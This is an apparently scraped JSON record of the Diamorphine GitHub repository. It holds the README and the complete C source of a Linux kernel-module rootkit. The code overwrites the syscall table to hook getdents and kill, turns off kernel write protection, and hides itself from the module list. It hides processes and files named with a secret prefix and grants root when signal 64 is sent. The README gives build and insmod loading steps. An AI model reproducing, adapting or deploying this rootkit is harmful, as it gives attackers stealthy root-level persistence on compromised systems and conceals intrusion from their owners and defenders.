{
  "metadata": {
    "timestamp": 1736710085497,
    "page": 710,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjcxMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "m0nad/Diamorphine",
      "stars": 1894,
      "defaultBranch": "master",
      "files": [
        {
          "name": "LICENSE.txt",
          "type": "blob",
          "size": 1.421875,
          "content": "Copyright (c) 2014, Victor N. Ramos Mello\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above copyright\n      notice, this list of conditions and the following disclaimer in the\n      documentation and/or other materials provided with the distribution.\n    * The name of the author may not be used to endorse or promote products\n      derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY\nDIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\nON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 0.185546875,
          "content": "obj-m := diamorphine.o\nCC = gcc -Wall \nKDIR := /lib/modules/$(shell uname -r)/build\nPWD := $(shell pwd)\n\nall:\n\t$(MAKE) -C $(KDIR) M=$(PWD) modules\n\nclean:\n\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 1.6279296875,
          "content": "Diamorphine\n===========\n\nDiamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)\n\nFeatures\n--\n\n- When loaded, the module starts invisible;\n\n- Hide/unhide any process by sending a signal 31;\n\n- Sending a signal 63(to any pid) makes the module become (in)visible;\n\n- Sending a signal 64(to any pid) makes the given user become root;\n\n- Files or directories starting with the MAGIC_PREFIX become invisible;\n\n- Source: https://github.com/m0nad/Diamorphine\n\nInstall\n--\n\nVerify if the kernel is 2.6.x/3.x/4.x/5.x\n```\nuname -r\n```\n\nClone the repository\n```\ngit clone https://github.com/m0nad/Diamorphine\n```\n\nEnter the folder\n```\ncd Diamorphine\n```\n\nCompile\n```\nmake\n```\n\nLoad the module(as root)\n```\ninsmod diamorphine.ko\n```\n\nUninstall\n--\n\nThe module starts invisible, to remove you need to make it visible\n```\nkill -63 0\n```\n\nThen remove the module(as root)\n```\nrmmod diamorphine\n```\n\nReferences\n--\nWikipedia Rootkit\nhttps://en.wikipedia.org/wiki/Rootkit\n\nLinux Device Drivers\nhttp://lwn.net/Kernel/LDD3/\n\nLKM HACKING\nhttps://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html\n\nMemset's blog\nhttp://memset.wordpress.com/\n\nLinux on-the-fly kernel patching without LKM\nhttp://phrack.org/issues/58/7.html\n\nWRITING A SIMPLE ROOTKIT FOR LINUX\nhttps://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt\n\nLinux Cross Reference\nhttp://lxr.free-electrons.com/\n\nzizzu0 LinuxKernelModules\nhttps://github.com/zizzu0/LinuxKernelModules/\n\nLinux Rootkits: New Methods for Kernel 5.7+\nhttps://xcellerator.github.io/posts/linux_rootkits_11/\n"
        },
        {
          "name": "diamorphine.c",
          "type": "blob",
          "size": 10.5927734375,
          "content": "#include <linux/sched.h>\n#include <linux/module.h>\n#include <linux/syscalls.h>\n#include <linux/dirent.h>\n#include <linux/slab.h>\n#include <linux/version.h> \n\n#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)\n#include <asm/uaccess.h>\n#endif\n\n#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)\n#include <linux/proc_ns.h>\n#else\n#include <linux/proc_fs.h>\n#endif\n\n#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)\n#include <linux/file.h>\n#else\n#include <linux/fdtable.h>\n#endif\n\n#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)\n#include <linux/unistd.h>\n#endif\n\n#ifndef __NR_getdents\n#define __NR_getdents 141\n#endif\n\n#include \"diamorphine.h\"\n\n#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)\nunsigned long cr0;\n#elif IS_ENABLED(CONFIG_ARM64)\nvoid (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);\nunsigned long start_rodata;\nunsigned long init_begin;\n#define section_size init_begin - start_rodata\n#endif\nstatic unsigned long *__sys_call_table;\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\n\ttypedef asmlinkage long (*t_syscall)(const struct pt_regs *);\n\tstatic t_syscall orig_getdents;\n\tstatic t_syscall orig_getdents64;\n\tstatic t_syscall orig_kill;\n#else\n\ttypedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,\n\t\tunsigned int);\n\ttypedef asmlinkage int (*orig_getdents64_t)(unsigned int,\n\t\tstruct linux_dirent64 *, unsigned int);\n\ttypedef asmlinkage int (*orig_kill_t)(pid_t, int);\n\torig_getdents_t orig_getdents;\n\torig_getdents64_t orig_getdents64;\n\torig_kill_t orig_kill;\n#endif\n\nunsigned long *\nget_syscall_table_bf(void)\n{\n\tunsigned long *syscall_table;\n\t\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)\n#ifdef KPROBE_LOOKUP\n\ttypedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n\tkallsyms_lookup_name_t kallsyms_lookup_name;\n\tregister_kprobe(&kp);\n\tkallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n\tunregister_kprobe(&kp);\n#endif\n\tsyscall_table = (unsigned long*)kallsyms_lookup_name(\"sys_call_table\");\n\treturn syscall_table;\n#else\n\tunsigned long int i;\n\n\tfor (i = (unsigned long int)sys_close; i < ULONG_MAX;\n\t\t\ti += sizeof(void *)) {\n\t\tsyscall_table = (unsigned long *)i;\n\n\t\tif (syscall_table[__NR_close] == (unsigned long)sys_close)\n\t\t\treturn syscall_table;\n\t}\n\treturn NULL;\n#endif\n}\n\nstruct task_struct *\nfind_task(pid_t pid)\n{\n\tstruct task_struct *p = current;\n\tfor_each_process(p) {\n\t\tif (p->pid == pid)\n\t\t\treturn p;\n\t}\n\treturn NULL;\n}\n\nint\nis_invisible(pid_t pid)\n{\n\tstruct task_struct *task;\n\tif (!pid)\n\t\treturn 0;\n\ttask = find_task(pid);\n\tif (!task)\n\t\treturn 0;\n\tif (task->flags & PF_INVISIBLE)\n\t\treturn 1;\n\treturn 0;\n}\n\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\nstatic asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {\n#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)\n\tint fd = (int) pt_regs->di;\n\tstruct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;\n#elif IS_ENABLED(CONFIG_ARM64)\n\tint fd = (int) pt_regs->regs[0];\n\tstruct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];\n#endif\n\tint ret = orig_getdents64(pt_regs), err;\n#else\nasmlinkage int\nhacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,\n\tunsigned int count)\n{\n\tint ret = orig_getdents64(fd, dirent, count), err;\n#endif\n\tunsigned short proc = 0;\n\tunsigned long off = 0;\n\tstruct linux_dirent64 *dir, *kdirent, *prev = NULL;\n\tstruct inode *d_inode;\n\n\tif (ret <= 0)\n\t\treturn ret;\n\n\tkdirent = kzalloc(ret, GFP_KERNEL);\n\tif (kdirent == NULL)\n\t\treturn ret;\n\n\terr = copy_from_user(kdirent, dirent, ret);\n\tif (err)\n\t\tgoto out;\n\n#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)\n\td_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;\n#else\n\td_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;\n#endif\n\tif (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)\n\t\t/*&& MINOR(d_inode->i_rdev) == 1*/)\n\t\tproc = 1;\n\n\twhile (off < ret) {\n\t\tdir = (void *)kdirent + off;\n\t\tif ((!proc &&\n\t\t(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))\n\t\t|| (proc &&\n\t\tis_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {\n\t\t\tif (dir == kdirent) {\n\t\t\t\tret -= dir->d_reclen;\n\t\t\t\tmemmove(dir, (void *)dir + dir->d_reclen, ret);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tprev->d_reclen += dir->d_reclen;\n\t\t} else\n\t\t\tprev = dir;\n\t\toff += dir->d_reclen;\n\t}\n\terr = copy_to_user(dirent, kdirent, ret);\n\tif (err)\n\t\tgoto out;\nout:\n\tkfree(kdirent);\n\treturn ret;\n}\n\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\nstatic asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {\n#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)\n\tint fd = (int) pt_regs->di;\n\tstruct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;\n#elif IS_ENABLED(CONFIG_ARM64)\n\t\tint fd = (int) pt_regs->regs[0];\n\tstruct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];\n#endif\n\tint ret = orig_getdents(pt_regs), err;\n#else\nasmlinkage int\nhacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,\n\tunsigned int count)\n{\n\tint ret = orig_getdents(fd, dirent, count), err;\n#endif\n\tunsigned short proc = 0;\n\tunsigned long off = 0;\n\tstruct linux_dirent *dir, *kdirent, *prev = NULL;\n\tstruct inode *d_inode;\n\n\tif (ret <= 0)\n\t\treturn ret;\t\n\n\tkdirent = kzalloc(ret, GFP_KERNEL);\n\tif (kdirent == NULL)\n\t\treturn ret;\n\n\terr = copy_from_user(kdirent, dirent, ret);\n\tif (err)\n\t\tgoto out;\n\n#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)\n\td_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;\n#else\n\td_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;\n#endif\n\n\tif (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)\n\t\t/*&& MINOR(d_inode->i_rdev) == 1*/)\n\t\tproc = 1;\n\n\twhile (off < ret) {\n\t\tdir = (void *)kdirent + off;\n\t\tif ((!proc && \n\t\t(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))\n\t\t|| (proc &&\n\t\tis_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {\n\t\t\tif (dir == kdirent) {\n\t\t\t\tret -= dir->d_reclen;\n\t\t\t\tmemmove(dir, (void *)dir + dir->d_reclen, ret);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tprev->d_reclen += dir->d_reclen;\n\t\t} else\n\t\t\tprev = dir;\n\t\toff += dir->d_reclen;\n\t}\n\terr = copy_to_user(dirent, kdirent, ret);\n\tif (err)\n\t\tgoto out;\nout:\n\tkfree(kdirent);\n\treturn ret;\n}\n\nvoid\ngive_root(void)\n{\n\t#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)\n\t\tcurrent->uid = current->gid = 0;\n\t\tcurrent->euid = current->egid = 0;\n\t\tcurrent->suid = current->sgid = 0;\n\t\tcurrent->fsuid = current->fsgid = 0;\n\t#else\n\t\tstruct cred *newcreds;\n\t\tnewcreds = prepare_creds();\n\t\tif (newcreds == NULL)\n\t\t\treturn;\n\t\t#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \\\n\t\t\t&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \\\n\t\t\t|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)\n\t\t\tnewcreds->uid.val = newcreds->gid.val = 0;\n\t\t\tnewcreds->euid.val = newcreds->egid.val = 0;\n\t\t\tnewcreds->suid.val = newcreds->sgid.val = 0;\n\t\t\tnewcreds->fsuid.val = newcreds->fsgid.val = 0;\n\t\t#else\n\t\t\tnewcreds->uid = newcreds->gid = 0;\n\t\t\tnewcreds->euid = newcreds->egid = 0;\n\t\t\tnewcreds->suid = newcreds->sgid = 0;\n\t\t\tnewcreds->fsuid = newcreds->fsgid = 0;\n\t\t#endif\n\t\tcommit_creds(newcreds);\n\t#endif\n}\n\nstatic inline void\ntidy(void)\n{\n\tkfree(THIS_MODULE->sect_attrs);\n\tTHIS_MODULE->sect_attrs = NULL;\n}\n\nstatic struct list_head *module_previous;\nstatic short module_hidden = 0;\nvoid\nmodule_show(void)\n{\n\tlist_add(&THIS_MODULE->list, module_previous);\n\tmodule_hidden = 0;\n}\n\nvoid\nmodule_hide(void)\n{\n\tmodule_previous = THIS_MODULE->list.prev;\n\tlist_del(&THIS_MODULE->list);\n\tmodule_hidden = 1;\n}\n\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\nasmlinkage int\nhacked_kill(const struct pt_regs *pt_regs)\n{\n#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)\n\tpid_t pid = (pid_t) pt_regs->di;\n\tint sig = (int) pt_regs->si;\n#elif IS_ENABLED(CONFIG_ARM64)\n\tpid_t pid = (pid_t) pt_regs->regs[0];\n\tint sig = (int) pt_regs->regs[1];\n#endif\n#else\nasmlinkage int\nhacked_kill(pid_t pid, int sig)\n{\n#endif\n\tstruct task_struct *task;\n\tswitch (sig) {\n\t\tcase SIGINVIS:\n\t\t\tif ((task = find_task(pid)) == NULL)\n\t\t\t\treturn -ESRCH;\n\t\t\ttask->flags ^= PF_INVISIBLE;\n\t\t\tbreak;\n\t\tcase SIGSUPER:\n\t\t\tgive_root();\n\t\t\tbreak;\n\t\tcase SIGMODINVIS:\n\t\t\tif (module_hidden) module_show();\n\t\t\telse module_hide();\n\t\t\tbreak;\n\t\tdefault:\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\n\t\t\treturn orig_kill(pt_regs);\n#else\n\t\t\treturn orig_kill(pid, sig);\n#endif\n\t}\n\treturn 0;\n}\n\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\nstatic inline void\nwrite_cr0_forced(unsigned long val)\n{\n\tunsigned long __force_order;\n\n\tasm volatile(\n\t\t\"mov %0, %%cr0\"\n\t\t: \"+r\"(val), \"+m\"(__force_order));\n}\n#endif\n\nstatic inline void\nprotect_memory(void)\n{\n#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\n\twrite_cr0_forced(cr0);\n#else\n\twrite_cr0(cr0);\n#endif\n#elif IS_ENABLED(CONFIG_ARM64)\n\tupdate_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,\n\t\t\tsection_size, PAGE_KERNEL_RO);\n\n#endif\n}\n\nstatic inline void\nunprotect_memory(void)\n{\n#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\n\twrite_cr0_forced(cr0 & ~0x00010000);\n#else\n\twrite_cr0(cr0 & ~0x00010000);\n#endif\n#elif IS_ENABLED(CONFIG_ARM64)\n\tupdate_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,\n\t\t\tsection_size, PAGE_KERNEL);\n#endif\n}\n\nstatic int __init\ndiamorphine_init(void)\n{\n\t__sys_call_table = get_syscall_table_bf();\n\tif (!__sys_call_table)\n\t\treturn -1;\n\n#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)\n\tcr0 = read_cr0();\n#elif IS_ENABLED(CONFIG_ARM64)\n\tupdate_mapping_prot = (void *)kallsyms_lookup_name(\"update_mapping_prot\");\n\tstart_rodata = (unsigned long)kallsyms_lookup_name(\"__start_rodata\");\n\tinit_begin = (unsigned long)kallsyms_lookup_name(\"__init_begin\");\n#endif\n\n\tmodule_hide();\n\ttidy();\n\n#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)\n\torig_getdents = (t_syscall)__sys_call_table[__NR_getdents];\n\torig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];\n\torig_kill = (t_syscall)__sys_call_table[__NR_kill];\n#else\n\torig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];\n\torig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];\n\torig_kill = (orig_kill_t)__sys_call_table[__NR_kill];\n#endif\n\n\tunprotect_memory();\n\n\t__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;\n\t__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;\n\t__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;\n\n\tprotect_memory();\n\n\treturn 0;\n}\n\nstatic void __exit\ndiamorphine_cleanup(void)\n{\n\tunprotect_memory();\n\n\t__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;\n\t__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;\n\t__sys_call_table[__NR_kill] = (unsigned long) orig_kill;\n\n\tprotect_memory();\n}\n\nmodule_init(diamorphine_init);\nmodule_exit(diamorphine_cleanup);\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\nMODULE_AUTHOR(\"m0nad\");\nMODULE_DESCRIPTION(\"LKM rootkit\");\n"
        },
        {
          "name": "diamorphine.h",
          "type": "blob",
          "size": 0.626953125,
          "content": "struct linux_dirent {\n        unsigned long   d_ino;\n        unsigned long   d_off;\n        unsigned short  d_reclen;\n        char            d_name[1];\n};\n\n#define MAGIC_PREFIX \"diamorphine_secret\"\n\n#define PF_INVISIBLE 0x10000000\n\n#define MODULE_NAME \"diamorphine\"\n\nenum {\n\tSIGINVIS = 31,\n\tSIGSUPER = 64,\n\tSIGMODINVIS = 63,\n};\n\n#ifndef IS_ENABLED\n#define IS_ENABLED(option) \\\n(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))\n#endif\n\n#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)\n#define KPROBE_LOOKUP 1\n#include <linux/kprobes.h>\nstatic struct kprobe kp = {\n\t    .symbol_name = \"kallsyms_lookup_name\"\n};\n#endif\n"
        }
      ]
    }
  ]
}